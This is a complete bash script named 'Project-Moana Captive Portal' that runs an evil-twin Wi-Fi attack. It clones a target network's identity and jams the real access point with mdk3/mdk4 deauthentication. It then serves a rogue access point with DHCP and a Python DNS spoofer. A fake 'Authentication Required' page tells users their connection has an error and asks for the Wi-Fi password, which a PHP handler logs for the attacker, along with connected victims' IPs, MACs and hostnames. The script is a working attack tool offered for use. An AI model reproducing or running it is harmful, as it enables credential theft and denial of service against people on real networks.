#/bin/bash

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
tp="\e[0m"
transparent="\e[0m"

function top1(){

	
	echo -e "   $blue\e[5m/~$~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$~"'\'
	echo -e "   $blue| $                                                                    $ |\e[25m"
  echo -e "   $blue\e[5m| $\e[25m"$green"                  Project-Moana  " "${red}C""${green}a""${yellow}p""${red}t""${green}i""${yellow}v""${red}e" "${green}P""${yellow}o""${red}r""${green}t""${yellow}a""${red}l"            $blue"                   \e[5m$ |\e[25m"
        echo -e "   $blue\e[5m| $                                                                    $ |\e[25m"
        echo -e "   $blue\e[5m| $                  \e[25m ""Created by:" $Cafe"Muhammad Ahmad"$blue"\e[5m                       $ |\e[25m"
	echo -e "   $blue\e[5m| $                                                                    $ |"
	echo -e "   $blue\~$~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$~/\e[25m""$transparent"
	echo
	echo

}







#####################################################################################################################################################
#############################Configuration
gateway_address="192.168.254.1"
gateway_network=${gateway_address%.*}

workspace=/tmp/moana
mkdir -p $workspace
touch /root/Project-Moana-Input.log

clients_viewer_file=clie_viewer.txt

touch $workspace/$clients_viewer_file
chmod 777 $workspace/$clients_viewer_file

confg=attack.conf

#Contents of config file
#$ap_inter      AP inter
#$ap_name1      name
#$target_mac    mac
#$var4          channel
#$deauth_inter  Deauthenticator interface





var1=`awk '{if(NR==1) print $0}' $confg`
var2=`awk '{if(NR==2) print $0}' $confg`
vor3=`awk '{if(NR==3) print $0}' $confg`
var4=`awk '{if(NR==4) print $0}' $confg`
var5=`awk '{if(NR==5) print $0}' $confg`

##################################################MAC

function alter_orig_mac {
replace="9A"
orig=`echo "$vor3" | awk -F':' '{print $5}'`
new_mac=${vor3//$orig/$replace}
var3="$new_mac"

}

function change_mac_of_inter {
echo "Changing mac..."
ifconfig $var1 down
macchanger -m $var3 $var1
ifconfig $var1 up
}

function add_mac_to_blacklist {
echo "Adding mac to blacklist file..."
  echo -e "$vor3" >"$workspace/mdk3_blacklist.lst"
}


function deuthenticator_interface_changing {
if [ -z "$var5" ]; then
   sleep 1
else
alter_orig_mac
change_mac_of_inter
add_mac_to_blacklist
fi
}


###################################################Monitor mode


######################################Create backup
function hstpd_back {
echo "Creating Hostapd configuration backup..."
mv /etc/hostapd/hostapd.conf $workspace/hostapd.conf
}

function create_hostapd_conf {
echo "Creating Hostapd configuration file..."
echo "interface=$var1
driver=nl80211
ssid=$var2
hw_mode=g
channel=$var4
macaddr_acl=0
ignore_broadcast_ssid=0" > /etc/hostapd/hostapd.conf
}



function hstpd_restore {
echo "Restoring Hostapd configuration backup..."
mv $workspace/hostapd.conf /etc/hostapd/hostapd.conf
} 


###########################################################LIGHTTPD

function lighttpd_back {

echo "Creating Lighttpd configuration backup..."
mv /etc/lighttpd/lighttpd.conf $workspace/lighttpd.conf
}




function create_lighttpd_conf {
echo "Creating lighttpd configuration file..."
echo "server.modules = (
	\"mod_access\",
	\"mod_alias\",
        \"mod_openssl\",
	\"mod_compress\",
 	\"mod_redirect\"
)

server.document-root        = \"/var/www/htmlM\"
server.upload-dirs          = (\" /var/cache/lighttpd/uploads \")
server.errorlog             = \"/var/log/lighttpd/error.log\"
server.pid-file             = \"/var/run/lighttpd.pid\"
server.username             = \"www-data\"
server.groupname            = \"www-data\"
server.port                 = 80


index-file.names            = ( \"index.php\", \"index.html\", \"index.lighttpd.html\" )
url.access-deny             = ( \"~\", \".inc\" )
static-file.exclude-extensions = ( \".php\", \".pl\", \".fcgi\" )

compress.cache-dir          = \"/var/cache/lighttpd/compress/\"
compress.filetype           = ( \"application/javascript\", \"text/css\", \"text/html\", \"text/plain\" )

# default listening port for IPv6 falls back to the IPv4 port
include_shell \"/usr/share/lighttpd/use-ipv6.pl \" + server.port
include_shell \"/usr/share/lighttpd/create-mime.assign.pl\"
include_shell \"/usr/share/lighttpd/include-conf-enabled.pl\"

\$SERVER[\"socket\"] == \":443\" {
	ssl.engine = \"enable\"
	ssl.pemfile = \"$workspace/server.pem\"
}


# Redirect all traffic to the captive portal when not emulating a connection.
\$HTTP[\"host\"] != \"captive.gateway.lan\" {
	url.redirect-code = 302
	url.redirect  = (
		\"^/(.*)\" => \"http://captive.gateway.lan/\",
	)
}
#Hello Im bad boy

" > /etc/lighttpd/lighttpd.conf

}





function lighttpd_restore {
echo "Restoring lighttpd configuration backup."
mv $workspace/lighttpd.conf /etc/lighttpd/lighttpd.conf
} 

#################################################################################DHCPD

  # Generate the dhcpd configuration file, which is
  # used to provide DHCP service to rogue AP clients.
function create_dhcpd_files {
echo "Creating dhcpd configuration file..."
  echo "\
authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $gateway_network.0 netmask 255.255.255.0 {
	option broadcast-address $gateway_network.255;
	option routers $gateway_address;
	option subnet-mask 255.255.255.0;
	option domain-name-servers $gateway_address;

	range $gateway_network.100 $gateway_network.254;
}\
" > $workspace/dhcpd.conf

  #create an empty leases file
  touch $workspace/dhcpd.leases

#create clients
touch $workspace/clients.txt
chmod 777 $workspace/clients.txt

}

##################################################################DNS
  # Create a DNS service with python, forwarding all traffic to gateway.
function create_dns_spoofer {
echo "Creating dns spoofer..."
echo "\
import sys, traceback, socket

class DNSQuery:
  def __init__(self, data):
    self.data = data
    self.domain = ''

    queryType = (ord(data[2]) >> 3) & 15

    # Only handle basic requests.
    if queryType != 0:
      print('Ignoring Query: Non-spoofed type.')
      return

    domainStart = 13 # Skip length byte and start at domain.
    domainLength = ord(data[domainStart - 1]) # Evaluate length byte.

    while domainLength != 0:
      self.domain += data[domainStart : domainStart + domainLength] + '.'

      domainStart += domainLength + 1 # Skip the length byte & start at domain.
      domainLength = ord(data[domainStart - 1]) # Evaluate length byte.

  def response(self, ipv4):
    if not self.domain: return ''

    packet = ''

    packet += self.data[ :2] + '\x81\x80'
    packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
    packet += self.data[12:]
    packet += '\xc0\x0c'
    packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'

    # Convert string IPv4 quads to binary values (bytes).
    packet += str.join('', map(lambda s: chr(int(s)), ipv4.split('.')))

    return packet

if __name__ == '__main__':
  targetIPv4 = '$gateway_address'

  print('DNS Spoofer working IN A %s' % targetIPv4)

  link = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  link.bind(('',53))

  try:
    while True:
      clientData, clientIPv4 = link.recvfrom(1024)

      queryData = clientData if sys.version_info < (3, 0) else clientData.decode('unicode_escape')

      query = DNSQuery(queryData)

      response = query.response(targetIPv4)

      if sys.version_info > (3, 0):
        # Someone that knows more about python and how it does byte-handling,
        # please fix the following shitfest and make it a bit more elegant.
        # Do what? A raw conversion of the \"response\" string to bytes.
        responseHex = ''
        for xx in response:
          responseHex += \"%x%x\" % ((ord(xx) >> 4) & 0b1111, ord(xx) & 0b1111)

        response = bytearray.fromhex(responseHex)

      link.sendto(response, clientIPv4)

      print('Request: %s -> %s' % (query.domain, targetIPv4))

  except KeyboardInterrupt:
    print('INTERRUPT: Stopping.')
    link.close()

  except Exception as error:
    print('EXCEPTION: Stopping!')
    print(error)
    print(traceback.format_exc())
    link.close()
" >"$workspace/dns_spoofer.py"

  chmod +x "$workspace/dns_spoofer.py"

}






























##########################################################LOGIN details
function backup_files_html {

echo "Backing up previous files in /var/www/html ..."
mv /var/www/html* $workspace/



}



function restore_files_html {
echo "Restoring previous files in /var/www/html ..."
rm -r /var/www/htmlM
mv $workspace/html* /var/www/
}



function create_login_files {


echo "Creating Splash page..."
mkdir /var/www/htmlM
cp logo.png /var/www/htmlM/

echo "\
<!DOCTYPE html>
<html>
<head>
<title>Authentication Required</title>
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
<style>
body {font-family: Arial, Helvetica, sans-serif;}

/* Full-width input fields */
input[type=text], input[type=text] {
    width: 100%;
    padding: 12px 20px;
    margin: 8px 0;
    display: inline-block;
    border: 1px solid #ccc;
    box-sizing: border-box;
}

/* Set a style for all buttons */
button {
    background-color: #4CAF50;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    cursor: pointer;
    width: 100%;
}

button:hover {
    opacity: 0.8;
}

/* Extra styles for the cancel button */
.cancelbtn {
    width: auto;
    padding: 10px 18px;
    background-color: #f44336;
}

/* Center the image and position the close button */
.imgcontainer {
    text-align: center;
    margin: 24px 0 12px 0;
    position: relative;
}

img.avatar {
    width: 40%;
    border-radius: 50%;
}

.container {
    padding: 16px;
}

span.psw {
    float: right;
    padding-top: 16px;
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
    padding-top: 60px;
}

/* Modal Content/Box */
.modal-content {
    background-color: #fefefe;
    margin: 3% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
    border: 1px solid #888;
    width: 90%; /* Could be more or less, depending on screen size */
}

/* The Close Button (x) */
.close {
    position: absolute;
    right: 25px;
    top: 0;
    color: #000;
    font-size: 35px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: red;
    cursor: pointer;
}

/* Add Zoom Animation */
.animate {
    -webkit-animation: animatezoom 0.6s;
    animation: animatezoom 0.6s
}

@-webkit-keyframes animatezoom {
    from {-webkit-transform: scale(0)} 
    to {-webkit-transform: scale(1)}
}
    
@keyframes animatezoom {
    from {transform: scale(0)} 
    to {transform: scale(1)}
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
    span.psw {
       display: block;
       float: none;
    }
    .cancelbtn {
       width: 100%;
    }
}




</style>
</head>
<body>


<div class=\"container\" style=\"background-color:rgb(141, 175, 86);width:auto;height:65px\">

</div>







<body onload=\"document.getElementById('id01').style.display='block'\" style=\"width:auto\" ></body>

<div id=\"id01\" class=\"modal\">
  
  <form method=\"post\" class=\"modal-content animate\" action=\"handler.php\">
    <div class=\"imgcontainer\">
      <span onclick=\"document.getElementById('id01').style.display='none'\" class=\"close\" title=\"Close Modal\">&times;</span>
      <img src=\"logo.png\" alt=\"router\" class=\"router\" style=\"width:100px;height:100px\" align=\"left\">
<br></br>
       <p style=\"font-size:19px\" >Authentication Required</p>
<br></br>                                                                                                             
       <p style=\"font-size:15px\">ERROR:		A connectivity issue has been detected on \"$var2\", MAC:\"$vor3\".    Internet connectivity has been suspended for a moment. To regain your connection back please enter your WIFI PASSWORD.</p>
    </div>

    <div class=\"container\">
      <label for= \"uname\"><b>PASSWORD:</b></label>
      <input type=\"text\" placeholder=\"Enter wifi password\" name=\"name\" id=\"name\" required>
 
    
      <button type=\"submit\" style=\"background-color:rgb(120, 162, 47)\" >SUBMIT</button>
     
<br></br>
      <center><p style=\"font-size:13px\">ERROR:(Connectivity.error).password_required_(0)</p></center>
     
      <center> <p style=\"font-size:16px\" >This page was forwaded by, site says:\"Broadband Router\". </p> </center>

    </div>


  </form>
</div>

<script>
// Get the modal
var modal = document.getElementById('id01');

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = \"none\";
    }
}
</script>

</body>
</html>" >"/var/www/htmlM/index.html"

echo '
<?php
    $myfile = fopen("input.log", "a+");
    $txt = "Password == ".$_POST['\''name'\''];
    fwrite($myfile, $txt);
    fclose($myfile);
?>' >"/var/www/htmlM/handler.php"



touch /var/www/htmlM/input.log
chmod 777 /var/www/htmlM/input.log


}



function deauthenticator {
  if ! [ -x "$(command -v mdk4)" ]; then
    xterm  $BOTTOM -bg black -fg "#FF0009" \
        -title "Deauthenticator" -e \
        "mdk3 $var5 d -c $var4 -b \"$workspace/mdk3_blacklist.lst\"" &
    # Save parent's pid, to get to child later.
    JammerXtermPID=$!
  else
    xterm  $BOTTOM -bg black -fg "#FF0009" \
        -title "Deauthenticator" -e \
        "mdk4 $var5 d -c $var4 -b \"$workspace/mdk3_blacklist.lst\"" &
    # Save parent's pid, to get to child later.
    JammerXtermPID=$!
  fi
}

function stop_deauthenticator {
  if [ "$JammerXtermPID" ]; then
    kill $(pgrep -P $JammerXtermPID)
    JammerXtermPID="" # Clear parent PID
  fi
}


function start_deuthenticator {
if [ -z "$var5" ]; then
  echo -e $red"No interface selected" $tp
else
echo -e $green"Starting deauthenticator..." $tp
  deauthenticator
fi
}




#####################################################33Add gateway address to interface
function add_gt_to_inter {
echo "Adding Gateway to interface..."
ifconfig $var1 up $gateway_address netmask 255.255.255.0
}
#######################################################SSSSL CERT
function create_ssl_cert {
echo "Creating SSL certificate..."
  xterm -bg "#000000" -fg "#CCCCCC" \
    -title "Generating Self-Signed SSL Certificate" -e openssl req \
    -subj '/CN=captive.gateway.lan/O=CaptivePortal/OU=Networking/C=PK' \
    -new -newkey rsa:2048 -days 365 -nodes -x509 \
    -keyout "$workspace/server.pem" \
    -out "$workspace/server.pem"
 
  chmod 400 "$workspace/server.pem"
}
###############################################################IPTABLES

function iptables_backup {
echo "Creating Iptables backup..."
iptables-save > $workspace/iptablesbackup.txt
}


function iptables_rules {
echo "Adding new Iptables rules..."
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain

iptables --table nat --append POSTROUTING --out-interface $var1 -j MASQUERADE
iptables --append FORWARD --in-interface $var1 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
}






function iptables_restore {
echo "Restoring Iptables backup..."
iptables-restore < $workspace/iptablesbackup.txt
}


###################################################

function start_network_manager {
  if ! systemctl status network-manager.service &> /dev/null; then
    systemctl start network-manager.service
   echo -e $green"Started network manager..." $tp
fi
}

function stop_network_manager {
  if systemctl status network-manager.service &> /dev/null; then
    systemctl stop network-manager.service
  echo -e $red"Stopped network manager." $tp
  fi
}




function start_hostapd {
  echo -e $green"Starting Hostapd..."$tp
  xterm $FLUXIONHoldXterm $TOPLEFT -bg black -fg "#99CCFF" \
    -title "Hostapd" -e \
    "hostapd /etc/hostapd/hostapd.conf" &
  # Save parent's pid, to get to child later.
  HostapdXtermPID=$!
}

function stop_hostapd {
echo -e $red"Killling Hostapd..." $tp
  # Kill captive portal web server log viewer.
  if [ "$HostapdXtermPID" ]; then
    kill $HostapdXtermPID
    killall hostapd
    HostapdXtermPID="" # Clear service PID
  fi
}




function start_lighttpd {
echo -e $green"Starting Webservice..."$tp
service lighttpd start
lighttpd-enable-mod fastcgi fastcgi-php
service lighttpd force-reload
}

function stop_lighttpd {
echo -e $red"Killing Webserver..." $tp
service lighttpd stop

}




function dhcpd { 
echo -e $green"Starting dhcp server..." $tp
xterm  $BOTTOMLEFT -bg black -fg "#CCCC00" \
    -title "DHCP Server" -e \
    "dhcpd -d -f -lf \"$workspace/dhcpd.leases\" -cf \"$workspace/dhcpd.conf\" | tee -a $workspace/clients.txt" &
  # Save parent's pid, to get to child later.
  DHCPServiceXtermPID=$!
}

#sleep 5
function kill_dhcp {
echo -e $red"Killing dhcp server..." $tp
  # Kill DHCP service.
  if [ "$DHCPServiceXtermPID" ]; then
    kill $(pgrep -P $DHCPServiceXtermPID) 
    DHCPServiceXtermPID="" # Clear parent PID
  fi
}



function dns {
echo -e $green"Starting DNS Spoofer..." $tp
  xterm  $TOP -bg black -fg "#99CCFF" \
    -title "DNS spoofer" -e \
    "if type python2 >/dev/null 2>/dev/null; then python2 \"$workspace/dns_spoofer.py\"; else python \"$workspace/dns_spoofer.py\"; fi" &
  # Save parent's pid, to get to child later.
  DNSServiceXtermPID=$!
}

function kill_dns {
echo -e $red"Killing DNS spoofer..."$tp
  # Kill python DNS service if one is found.
  if [ "$DNSServiceXtermPID" ]; then
    kill $(pgrep -P $DNSServiceXtermPID) 
    DNSServiceXtermPID="" # Clear parent PID
  fi
}

function input_identifier {
echo -e $green"Starting Input_Identifier..."$tp
  xterm  $BOTTOMRIGHT -bg black -fg "#00CC00" \
    -title "Input Identifier" -e \
    "tail -f \"/var/www/htmlM/input.log\" | tee -a /root/Project-Moana-Input.log" &
  InputIdentifierXtermPID=$!
}



#tail -f /var/lof/freeswitch/freeswitch.log | grep --line-buffered "Playing:" > temp



function stop_identifier {
echo -e $red"Killing Identifier..."$tp
  if [ "$InputIdentifierXtermPID" ]; then
    kill $InputIdentifierXtermPID
    InputIdentifierXtermPID="" # Clear service PID
  fi
}


function dis_ap_inter_mon {

ifconfig $var1 down
iwconfig $var1 mode managed
ifconfig $var1 up
echo "Monitor mode disabled on $var1."
}

#disable deauth inter mon

function dis_deauth_inter_mon {
ifconfig $var5 down
iwconfig $var5 mode managed
ifconfig $var5 up
echo "Monitor mode disabled on $var5."
}


function check_disable_deauth_intermon {
if [ -z "$var5" ]
then
      echo -e $red "You haven't selected a Deauthenticating interface. So can't disable monitor mode." $tp
else
      dis_deauth_inter_mon
fi
}

function strt_jammer {
if [ -z "$var5" ]; then
  sleep 1
else
deauthenticator
fi
}


function start_client_viewer {
echo 0 >"$workspace/$clients_viewer_file"
}



#######################################################################################################################################################

top1
stop_network_manager
deuthenticator_interface_changing
add_gt_to_inter
hstpd_back
lighttpd_back
iptables_backup
backup_files_html

iptables_rules
create_hostapd_conf   
create_lighttpd_conf
create_ssl_cert
create_dhcpd_files
create_dns_spoofer
create_login_files


start_hostapd
sleep 1
dhcpd
start_lighttpd 
dns
input_identifier
strt_jammer
sleep 1
start_client_viewer

function clean_mess1 {
clear
top1
echo ""
echo -e $green"THANKS for using Project-Moana Captive Portal..."$tp
echo "
"
echo -e $red"Cleaning mess....." $tp
echo ""
sleep 1
stop_hostapd
kill_dhcp
kill_dns
stop_lighttpd
stop_identifier
stop_deauthenticator
hstpd_restore
lighttpd_restore
iptables_restore
restore_files_html
dis_ap_inter_mon
check_disable_deauth_intermon
start_network_manager
rm -rf $workspace
sleep 2
#clear
}



###############################################

function cre_files {
touch $workspace/ip.log
touch $workspace/mac.log
touch $workspace/naams.log
chmod 777 $workspace/ip.log
chmod 777 $workspace/mac.log
chmod 777 $workspace/naams.log
}
function b {

while [ "`cat $workspace/$clients_viewer_file`" = 0 ]
do 
ip=`grep "^lease" $workspace/dhcpd.leases |uniq | awk -F' ' '{print $2}'`
echo $ip >"$workspace/ip.log"

 sleep 2
 done
}


function c {

while [ "`cat $workspace/$clients_viewer_file`" = 0 ]
do 
macss=`grep "ethernet" $workspace/dhcpd.leases |uniq | awk -F' ' '{print $3}' | sed 's/\;//g'`
echo $macss >"$workspace/mac.log"
 sleep 2
 done
}




function client_naams {
while [ "`cat $workspace/$clients_viewer_file`" = 0 ]
do 
naams=`grep "hostname" $workspace/dhcpd.leases |uniq | awk -F' ' '{print $2}' | sed 's/\;//g'`
echo $naams >"$workspace/naams.log"
 sleep 2
 done
}

function echo_details {
while [ "`cat $workspace/$clients_viewer_file`" = 0 ]
do
List=$workspace/naams.log
naam1=`awk '{if(NR==1) print $1}' $List`
naam2=`awk '{if(NR==1) print $2}' $List`
naam3=`awk '{if(NR==1) print $3}' $List`
naam4=`awk '{if(NR==1) print $4}' $List`
naam5=`awk '{if(NR==1) print $5}' $List`
naam6=`awk '{if(NR==1) print $6}' $List`
naam7=`awk '{if(NR==1) print $7}' $List`
naam8=`awk '{if(NR==1) print $8}' $List`
naam9=`awk '{if(NR==1) print $9}' $List`
naam10=`awk '{if(NR==1) print $10}' $List`

List1=$workspace/mac.log
mac1=`awk '{if(NR==1) print $1}' $List1`
mac2=`awk '{if(NR==1) print $2}' $List1`
mac3=`awk '{if(NR==1) print $3}' $List1`
mac4=`awk '{if(NR==1) print $4}' $List1`
mac5=`awk '{if(NR==1) print $5}' $List1`
mac6=`awk '{if(NR==1) print $6}' $List1`
mac7=`awk '{if(NR==1) print $7}' $List1`
mac8=`awk '{if(NR==1) print $8}' $List1`
mac9=`awk '{if(NR==1) print $9}' $List1`
mac10=`awk '{if(NR==1) print $10}' $List1`

List2=$workspace/ip.log
ip1=`awk '{if(NR==1) print $1}' $List2`
ip2=`awk '{if(NR==1) print $2}' $List2`
ip3=`awk '{if(NR==1) print $3}' $List2`
ip4=`awk '{if(NR==1) print $4}' $List2`
ip5=`awk '{if(NR==1) print $5}' $List2`
ip6=`awk '{if(NR==1) print $6}' $List2`
ip7=`awk '{if(NR==1) print $7}' $List2`
ip8=`awk '{if(NR==1) print $8}' $List2`
ip9=`awk '{if(NR==1) print $9}' $List2`
ip10=`awk '{if(NR==1) print $10}' $List2`

clear
echo "


"
clients=`grep "^lease" $workspace/dhcpd.leases |sort |uniq |wc -l`
echo -ne "                               Clients:"$red" $clients \r"$transparent
echo "


"
echo -e $green"     Clients IP's""             Clients MAC""               Clients NAMES"$transparent
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e "   $ip1   ""    $mac1""          $naam1" 
echo -e "   $ip2   ""    $mac2""          $naam2 "   
echo -e "   $ip3   ""    $mac3""          $naam3"
echo -e "   $ip4   ""    $mac4""          $naam4"
echo -e "   $ip5   ""    $mac5""          $naam5 " 
echo -e "   $ip6   ""    $mac6""          $naam6  "    
echo -e "   $ip7   ""    $mac7""          $naam7"
echo -e "   $ip8   ""    $mac8""          $naam8"
echo -e "   $ip9   ""    $mac9""          $naam9"
echo -e "   $ip10  ""    $mac10""          $naam10 "  
echo "



"
echo -e $red"                            To exit press Ctrl-c..."$transparent










trap CTRL_c INT
function CTRL_c() {

echo 1 >"$workspace/$clients_viewer_file"     
}


sleep 1
done 

}
client_naams & b & c & echo_details

sleep 2
clean_mess1

clear
echo ""
top1
echo "


"
echo -e $green"               THANKS for using Project-Moana Captive portal"$transparent
sleep 3
exit
exit






